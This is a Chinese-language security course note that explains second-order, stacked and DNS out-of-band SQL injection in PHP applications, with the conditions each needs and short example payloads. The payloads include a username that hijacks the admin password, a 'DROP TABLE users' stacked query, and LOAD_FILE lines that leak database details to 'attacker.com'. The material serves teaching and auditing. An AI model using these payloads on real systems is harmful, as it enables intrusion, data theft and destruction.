# 🛡️ 课程名称：PHP应用安全 - SQL注入专题（第45天）

![](img/9aeb75e0226383dec5757bd012bce7e7_1.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_2.png)

## 📚 概述
在本节课中，我们将要学习SQL注入中三种相对特殊但重要的攻击方式：二次注入、堆叠注入和DNS带外注入。这些方法虽然在实战中不如常规注入常见，但在特定场景和代码审计中具有重要意义，理解它们有助于拓宽安全测试的思路。

![](img/9aeb75e0226383dec5757bd012bce7e7_4.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_6.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_8.png)

---

![](img/9aeb75e0226383dec5757bd012bce7e7_10.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_11.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_12.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_14.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_16.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_18.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_20.png)

## 🔄 第一节：二次注入原理与利用

![](img/9aeb75e0226383dec5757bd012bce7e7_22.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_24.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_26.png)

上一节我们介绍了基于不同请求和权限的SQL注入，本节中我们来看看一种需要两个步骤才能触发的注入类型——二次注入。

![](img/9aeb75e0226383dec5757bd012bce7e7_28.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_30.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_32.png)

二次注入的核心特点是：攻击者先将恶意SQL代码通过正常的“插入”操作（如用户注册、留言提交）存入数据库。之后，当应用程序从数据库中取出这些被污染的数据，并将其用于构建新的SQL查询时，才会触发注入。

![](img/9aeb75e0226383dec5757bd012bce7e7_34.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_36.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_38.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_40.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_42.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_44.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_46.png)

### 核心流程
1.  **植入阶段**：通过INSERT语句将恶意数据写入数据库。
2.  **触发阶段**：应用程序在后续逻辑（如用户登录后修改信息）中，从数据库取出该数据并拼接到新的SQL语句（如UPDATE、SELECT）中执行，从而触发注入。

![](img/9aeb75e0226383dec5757bd012bce7e7_48.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_50.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_52.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_54.png)

### 关键利用条件
二次注入的成功需要满足两个关键条件：
*   **数据插入时有转义**：在第一次插入恶意数据时，代码中必须存在转义函数（如`addslashes`）或开启了魔术引号（`magic_quotes_gpc`）。这确保了包含单引号等特殊字符的恶意数据能够“正常”地存入数据库，而不会在插入阶段就因SQL语法错误而失败。
*   **后续存在调用点**：存入数据库的恶意数据必须在后续某个功能点（如信息更新、查询）中被取出并拼接到新的SQL语句中。

![](img/9aeb75e0226383dec5757bd012bce7e7_56.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_58.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_60.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_62.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_64.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_66.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_67.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_69.png)

### 代码示例
假设用户注册时，用户名被插入数据库：
```sql
INSERT INTO users (username, password) VALUES ('$username', '$password')
```
攻击者注册用户名为 `admin'#`。
后续，当用户登录后修改密码时，代码可能这样执行：
```sql
UPDATE users SET password='$new_password' WHERE username='$current_username'
```
此时，`$current_username` 从数据库取出为 `admin'#`。拼接后的SQL语句变为：
```sql
UPDATE users SET password='newpass' WHERE username='admin'#'
```
`#` 注释掉了后面的单引号，使得条件变为 `WHERE username='admin'`，从而可能修改了admin用户的密码。

![](img/9aeb75e0226383dec5757bd012bce7e7_71.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_73.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_75.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_77.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_79.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_81.png)

---

![](img/9aeb75e0226383dec5757bd012bce7e7_83.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_85.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_87.png)

## 🧱 第二节：堆叠注入原理与利用

上一节我们介绍了需要两步触发的二次注入，本节中我们来看看一种能一次性执行多条SQL语句的注入——堆叠注入。

![](img/9aeb75e0226383dec5757bd012bce7e7_89.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_91.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_93.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_95.png)

堆叠注入是指攻击者通过注入点，利用分号`;`分隔，在一次数据库调用中执行多条SQL语句。这赋予了攻击者更大的操作权限，可以直接执行创建表、删除数据、更新权限等任意数据库命令。

![](img/9aeb75e0226383dec5757bd012bce7e7_97.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_99.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_101.png)

### 核心概念
利用SQL语句中的分号`;`表示语句结束的特性，在注入点后构造新的、独立的SQL语句。
**公式表示**：
```
原始查询; 攻击者构造的新SQL语句;
```

![](img/9aeb75e0226383dec5757bd012bce7e7_103.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_105.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_107.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_109.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_111.png)

### 关键利用条件
堆叠注入的利用条件较为苛刻：
1.  **数据库支持**：目标数据库类型需要支持多语句执行（如MySQL、SQL Server、PostgreSQL支持，但Oracle通常不支持）。
2.  **代码函数支持**：应用程序中执行SQL查询的函数必须支持多语句执行。例如，在PHP中，`mysqli_multi_query()` 函数支持，而 `mysqli_query()` 通常只执行第一条语句。

![](img/9aeb75e0226383dec5757bd012bce7e7_113.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_115.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_117.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_119.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_120.png)

### 利用示例
假设存在注入点 `id=1`，原始查询为：
```sql
SELECT * FROM products WHERE id=1
```
攻击者可以构造：
```
id=1; DROP TABLE users;
```
最终执行的SQL为：
```sql
SELECT * FROM products WHERE id=1; DROP TABLE users;
```
这将导致 `users` 表被删除。

![](img/9aeb75e0226383dec5757bd012bce7e7_122.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_124.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_126.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_128.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_130.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_132.png)

---

![](img/9aeb75e0226383dec5757bd012bce7e7_134.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_136.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_138.png)

## 📡 第三节：DNS带外注入原理与利用

![](img/9aeb75e0226383dec5757bd012bce7e7_140.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_142.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_144.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_146.png)

上一节我们介绍了能执行多条命令的堆叠注入，本节中我们来看看一种用于解决“无回显”注入场景的技术——DNS带外注入。

![](img/9aeb75e0226383dec5757bd012bce7e7_148.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_150.png)

DNS带外注入主要应用于SQL注入点没有直接数据回显（即盲注），且无法通过时间盲注等方式有效获取信息的情况。其核心思想是让数据库引擎发起一个DNS查询请求，并将查询结果（我们想获取的数据）放在域名中，通过监控DNS日志来获取数据。

![](img/9aeb75e0226383dec5757bd012bce7e7_152.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_154.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_156.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_158.png)

### 核心原理
利用数据库函数（如MySQL的`load_file()`）去访问一个由攻击者控制的域名，并将查询结果作为子域名的一部分。
**公式表示**：
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.攻击者控制的域名\\abc'))
```
当数据库执行此语句时，会尝试解析 `数据库名.攻击者控制的域名`，攻击者在其DNS服务器日志中即可看到 `数据库名` 这个信息。

![](img/9aeb75e0226383dec5757bd012bce7e7_160.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_162.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_164.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_166.png)

### 关键利用条件
DNS带外注入的利用条件非常严格：
1.  **高数据库权限**：执行注入的数据库用户需要具备 `FILE` 权限（通常是root或高权限用户）。
2.  **支持文件读取函数**：数据库配置允许 `load_file()` 这类函数读取网络路径。这受数据库配置 `secure_file_priv` 的限制，若该值不为空或不包含网络路径，则无法利用。
3.  **出网限制**：目标服务器必须能向外部DNS服务器发起请求。

![](img/9aeb75e0226383dec5757bd012bce7e7_168.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_170.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_172.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_174.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_176.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_178.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_180.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_182.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_184.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_186.png)

### 简要流程
1.  攻击者拥有一个域名（如 `attacker.com`）并配置其DNS解析记录。
2.  在注入点构造Payload，使数据库查询 `SELECT @@version`，并将结果拼接到子域名。
3.  数据库执行 `LOAD_FILE('\\\\5.7.26.attacker.com\\foo')`，发起DNS查询。
4.  攻击者在 `attacker.com` 的DNS日志中看到查询记录 `5.7.26.attacker.com`，从而得知数据库版本为 `5.7.26`。

![](img/9aeb75e0226383dec5757bd012bce7e7_188.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_190.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_192.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_194.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_196.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_197.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_199.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_201.png)

---

![](img/9aeb75e0226383dec5757bd012bce7e7_203.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_205.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_207.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_209.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_211.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_213.png)

## ✅ 总结
本节课中我们一起学习了SQL注入中三种特殊的攻击技术：
*   **二次注入**：强调“先存储，后触发”的利用链，依赖于数据插入时的转义和后续功能的调用。
*   **堆叠注入**：利用分号执行多条SQL语句，威力大但受数据库和代码函数限制。
*   **DNS带外注入**：一种用于无回显场景的信息外带技术，通过DNS协议泄露数据，但利用条件（高权限、配置允许）极为苛刻。

![](img/9aeb75e0226383dec5757bd012bce7e7_215.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_217.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_219.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_221.png)

![](img/9aeb75e0226383dec5757bd012bce7e7_223.png)

理解这些技术有助于在代码审计和更复杂的安全测试场景中识别潜在风险。虽然它们在自动化漏洞扫描或常规黑盒测试中难以被发现，但在白盒审计和CTF比赛中是重要的考点。下节课我们将开始学习PHP应用中的其他类型漏洞。